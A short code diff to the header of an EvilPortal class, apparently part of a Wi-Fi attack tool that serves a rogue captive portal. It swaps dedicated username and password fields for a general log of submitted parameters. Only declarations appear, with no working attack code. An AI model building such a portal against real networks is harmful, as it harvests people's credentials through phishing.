@@ -73,11 +73,9 @@ class EvilPortal {
 
   private:
     bool runServer;
-    bool name_received;
-    bool password_received;
+    bool something_received;
 
-    String user_name;
-    String password;
+    String params_log;
 
     bool has_html;
     bool has_ap;
@@ -103,8 +101,6 @@ class EvilPortal {
 
     LinkedList<String>* html_files;
 
-    String get_user_name();
-    String get_password();
     void setup();
     bool begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points);
     void main(uint8_t scan_mode);
